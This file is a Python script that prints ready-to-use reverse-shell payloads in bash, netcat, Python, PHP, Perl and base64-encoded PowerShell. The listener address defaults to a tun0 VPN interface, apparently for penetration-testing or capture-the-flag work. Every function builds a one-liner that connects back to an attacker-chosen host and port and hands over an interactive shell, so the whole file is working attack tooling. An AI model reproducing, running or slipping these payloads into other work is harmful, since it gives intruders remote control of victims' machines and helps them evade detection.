#!/usr/bin/env python3

import sys
import base64

import netifaces as ni

TUN0_IP = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

def usage():
    print("Usage: {} -t <shell_type> -i <LHOST> -p <LPORT>".format(sys.argv[0]))
    sys.exit(1)

def generate_bash(LHOST, LPORT):
    return """
======================================================================
[+ BASH]
/bin/sh -i >& /dev/tcp/{}/{} 0>&1
""".format(LHOST, LPORT)

def generate_netcat(LHOST, LPORT):
    return """
======================================================================
[+ NETCAT]
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f

nc {} {} -e /bin/sh
""".format(LHOST, LPORT, LHOST, LPORT)

def generate_python(LHOST, LPORT):
    return """
======================================================================
[+ PYTHON]
python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{}\",{}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'
""".format(LHOST, LPORT, LHOST, LPORT, LHOST, LPORT)

def generate_php(LHOST, LPORT):
    return """
======================================================================
[+ PHP]
php -r '\$sock=fsockopen(\"{}\",{});exec(\"/bin/sh <&3 >&3 2>&3\");'
""".format(LHOST, LPORT)

def generate_perl(LHOST, LPORT):
    return """
======================================================================
[+ PERL]
perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
""".format(LHOST, LPORT)


def generate_powershell(LHOST, LPORT):
    header = """
======================================================================
[+ POWERSHELL64]\n
"""
    prefix = "powershell -e "
    payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);\
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};\
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding)\
.GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );\
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";\
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};\
$client.Close()'%(LHOST,LPORT)
    encoded_payload = base64.b64encode(payload.encode('utf-16')[2:]).decode()
    return header + prefix + encoded_payload

def generate_payloads(LHOST, LPORT, shell_type):
    output = ""
    payloads = {
        'bash': generate_bash(LHOST, LPORT),
        'nc': generate_netcat(LHOST, LPORT),
        'python': generate_python(LHOST, LPORT),
        'php': generate_php(LHOST, LPORT),
        'perl': generate_perl(LHOST, LPORT),
        'ps': generate_powershell(LHOST, LPORT)
    }
    if shell_type != "all":
      return payloads.get(shell_type, "Invalid shell type")
    for shell_type in payloads.keys():
      output += payloads.get(shell_type, "Invalid shell type")
    return output

if __name__ == "__main__":
    # Initialize default values
    LHOST = TUN0_IP
    LPORT = 80
    shell_type = "all"

    # Parse the command-line arguments
    i = 1
    while i < len(sys.argv):
        if sys.argv[i] == '-t':
            shell_type = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '-i':
            LHOST = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '-p':
            LPORT = int(sys.argv[i + 1])
            i += 2
        else:
            usage()

    # Generate and print payloads based on the given parameters
    payload = generate_payloads(LHOST, LPORT, shell_type)
    print(payload)
